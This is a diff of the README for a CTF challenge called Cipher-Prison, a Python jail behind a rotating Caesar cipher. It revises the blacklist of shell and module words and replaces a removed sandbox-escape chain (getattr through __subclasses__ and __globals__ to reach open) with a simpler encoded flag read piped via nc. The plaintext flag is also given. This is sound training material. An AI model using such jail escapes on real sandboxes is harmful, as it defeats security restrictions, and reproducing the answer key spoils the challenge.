@@ -4,18 +4,18 @@ A CTF challenge combining a Python jail with a dynamic rotating Caesar cipher.
 
 ## Challenge Info
 
-| Field | Value |
-|-------|-------|
-| **Name** | Cipher-Prison |
-| **Category** | misc / pyjail |
-| **Difficulty** | Medium-Hard (400-450 pts) |
-| **Flag** | `DSCCTF{dyn4m1c_k3ysw4p_j41l_br34k3r_2026}` |
-| **Port** | 1337 |
+| Field         | Value |
+|-------        |-------|
+| **Name**      | Cipher-Prison |
+| **Category**  | pyjail |
+| **Difficulty**| Medium (200-250 pts) |
+| **Flag**      | `DSCCTF{dyn4m1c_k3ysw4p_j41l_br34k3r_2026}` |
+| **Port**      | 1337 |
 
 ## Challenge Description (for CTF platform)
 
 ```
-🔐 Cipher-Prison [misc/jail] - 450 pts
+🔐 Cipher-Prison [misc/jail] - 250 pts
 
 Welcome to the prison where words are twisted and secrets are scrambled.
 
@@ -26,9 +26,9 @@ The ancient Romans might know what's happening here.
 
 Can you escape and claim the flag?
 
-nc ctf.yourserver.com 1337
+nc ctf.server.com 1337
 
-Author: pranav
+Author: ShadowPB
 ```
 
 ---
@@ -72,21 +72,21 @@ You must type: wypuA(1+1)
 ### 2. Blacklisted Words (INSTANT DEATH)
 
 Using these words **immediately kills the connection**:
-- `import`, `exec`, `eval`, `compile`, `input`
-- `subprocess`, `sys`, `socket`, `pty`, `posix`
-- `locals`, `vars`, `dir`, `environ`
-- And more...
+- `import`, `exec`, `eval`, `compile` 
+- `subprocess`, `system`, `popen`
+- Much more permissive than before!
 
 ### 3. Blocked Characters
 
 - `_` (underscore) - **The key restriction!** Must use `chr(95)` instead
 
-### 4. Allowed (Intentionally for solve path)
+### 4. Allowed (Much more permissive!)
 
-- `getattr`, `chr`, `ord`, `str`, `type`
-- `class`, `base`, `mro`, `subclasses`, `init`
-- `globals`, `open`, `os`, `builtins`, `flag`
-- `.` (dot), `[`, `]` (brackets)
+- `open()` - **Direct file access!**
+- `print()`, `str()`, `int()`, `len()` - Basic functions
+- `getattr`, `chr`, `ord`, `type` - Attribute access
+- `.` (dot), `[`, `]` (brackets) - Direct access
+- **Goal: Just read the flag with encoded input!**
 
 ### 5. Variables Persist
 
@@ -113,29 +113,16 @@ def encode(text, rotation):
 
 | Rot | What to Execute | What to Type |
 |-----|-----------------|--------------|
-| 0 | `u=chr(95)*2` | `u=chr(95)*2` |
-| 7 | `c=getattr("",u+"class"+u)` | `j=nlAhAAy("",B+"jshzz"+B)` |
-| 14 | `b=getattr(c,u+"bases"+u)[0]` | `p=usHoHHF(q,I+"poGsG"+I)[e]` |
-| 21 | `s=getattr(b,u+"subclasses"+u)()` | `N=BzOvOOM(w,P+"NPwxGvNNzN"+P)()` |
-| 28 | `w=s[158]` | `Y=U[txA]` |
-| 35 | `g=getattr(getattr(w,u+"init"+u),u+"globals"+u)` | `P=PN2J220(PN2J220(5,3+"RWR2"+3),3+"PUXKJU1"+3)` |
-| 42 | `print(g[u+"builtins"+u]["open"]("/flag.txt").read())` | `57Y39(W[a+"RaY19Y38"+a]["45U3"]("/V1QW.9d9").7UQT())` |
+| 0 | `print("Testing cipher")` | `print("Testing cipher")` |
+| 7 | `print(open("/flag.txt").read())` | `wypuA(vwlu("/mshn.AEA").ylhk())` |
 
-**Note:** Index 158 is for `os._wrap_close`. This may vary by Python version. Step 4 can be used to find the correct index:
-```
-print([i for i,x in enumerate(s) if "wrap" in str(x)])
-```
+**That's it!** Just 2 simple steps thanks to the simplified restrictions.
 
 ### Full Automated Exploit
 
 ```bash
-echo 'u=chr(95)*2
-j=nlAhAAy("",B+"jshzz"+B)
-p=usHoHHF(q,I+"poGsG"+I)[e]
-N=BzOvOOM(w,P+"NPwxGvNNzN"+P)()
-Y=U[txA]
-P=PN2J220(PN2J220(5,3+"RWR2"+3),3+"PUXKJU1"+3)
-57Y39(W[a+"RaY19Y38"+a]["45U3"]("/V1QW.9d9").7UQT())' | nc TARGET 1337
+echo 'print("Testing cipher")
+wypuA(vwlu("/mshn.AEA").ylhk())' | nc TARGET 1337
 ```
 
 **Output:**
